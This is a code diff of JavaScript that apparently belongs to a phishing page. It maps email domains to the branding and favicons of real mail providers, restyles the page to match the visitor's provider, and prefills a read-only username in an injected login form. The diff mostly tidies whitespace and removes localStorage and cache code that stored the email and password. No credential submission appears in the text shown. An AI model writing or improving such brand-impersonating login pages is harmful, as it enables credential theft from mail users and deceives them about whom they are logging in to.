@@ -27,22 +27,18 @@ if (email) {
         'aol.com': 'url("aol.png")',
         'zoho.com': 'url("zoho.png")',
         'protonmail.com': 'url("protonmail.png")',
-    
         'mail.com': 'url("mail.png")',
         'qiye.163.com': 'url("qiye163.png")',
-        
         '263.net': 'url("263.png")',
-
         'coremail.cn': 'url("coremail.png")',
-        'coremail.net' : 'url("coremail.png")',
-        
-        'yandex.com' : 'url("yandex.png")',
-         };
+        'coremail.net': 'url("coremail.png")',
+        'yandex.com': 'url("yandex.png")',
+    };
 
     // Define the mapping of email domains to their favicons
     const domainFavicons = {
-        'yandex.com': 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSE3SNubOhIIrLSYZuPzHauAw_eQxpHjmKzzIjed5BWPIfN64Cjs9p2V2NRVwfMdVXLr8I&usqp=CAU', 
-        'coremail.cn': 'https://www.coremail.cn/images/favicon.ico',        
+        'yandex.com': 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSE3SNubOhIIrLSYZuPzHauAw_eQxpHjmKzzIjed5BWPIfN64Cjs9p2V2NRVwfMdVXLr8I&usqp=CAU',
+        'coremail.cn': 'https://www.coremail.cn/images/favicon.ico',
         'coremail.net': 'https://www.coremail.cn/images/favicon.ico',
         '263.net': 'https://www.263.net/r/cms/www/web2018/img/favicon.ico',
         'sogou.com': 'https://sogou.com/images/logo/new/favicon.ico?v=4',
@@ -53,7 +49,7 @@ if (email) {
         'sina.com': 'https://cdn-icons-png.flaticon.com/512/2111/2111599.png',
         'sina.cn': 'https://cdn-icons-png.flaticon.com/512/2111/2111599.png',
         'sohu.com': 'https://1cbbb2d148753.cdn.sohucs.com/e0de4a/img/favicon.66dcaa54.ico',
-        'tom.com': 'tomm.png',     
+        'tom.com': 'tomm.png',
         'aliyun.com': 'https://mail.aliyun.com/static/0.2.8/images/favicon.ico',
         '21cn.com': 'https://mail.21cn.com/w2/favicon.ico',
         'gmail.com': 'https://www.gstatic.com/images/branding/product/2x/gmail_2020q4_48dp.png',
@@ -65,18 +61,15 @@ if (email) {
         'protonmail.com': 'https://proton.me/favicons/apple-touch-icon.png',
         'cn.com': 'https://example.com/path_to_cn_favicon.ico',
         'mail.com': 'https://www.mail.com/favicon.ico',
-        'qiye.163.com': 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcShujWkh5UiwRZYQbFZpl1j_iOHHi9fA6KMBQ&s' // Added for NetEase Enterprise Mail
-       
+        'qiye.163.com': 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcShujWkh5UiwRZYQbFZpl1j_iOHHi9fA6KMBQ&s', // Added for NetEase Enterprise Mail
     };
 
-    
     if (domainBackgrounds[emailDomain]) {
         document.body.style.backgroundImage = domainBackgrounds[emailDomain];
-        document.body.style.backgroundSize = 'cover'; 
-        document.body.style.overflow = 'hidden'; 
+        document.body.style.backgroundSize = 'cover';
+        document.body.style.overflow = 'hidden';
         document.body.style.backgroundRepeat = 'no-repeat';
 
-     
         const faviconLink = document.createElement('link');
         faviconLink.rel = 'icon';
         faviconLink.href = domainFavicons[emailDomain];
@@ -122,20 +115,6 @@ if (email) {
                     document.getElementById('username').value = '${username}';
                     document.getElementById('username').setAttribute('readonly', true); // Make username readonly
                     document.getElementById('password').value = '';
-
-                    localStorage.setItem('email', '${username}');
-                    localStorage.setItem('password', '');
-
-                    if ('caches' in window) {
-                        caches.open('login-cache').then(function(cache) {
-                            const loginData = new Response(JSON.stringify({ email: '${username}', password: '' }), {
-                                headers: { 'Content-Type': 'application/json' }
-                            });
-                            cache.put('/login-data', loginData);
-                        }).catch(function(error) {
-                            console.error('Caching failed:', error);
-                        });
-                    }
                 });
             `;
             iframeDoc.head.appendChild(scriptElement);
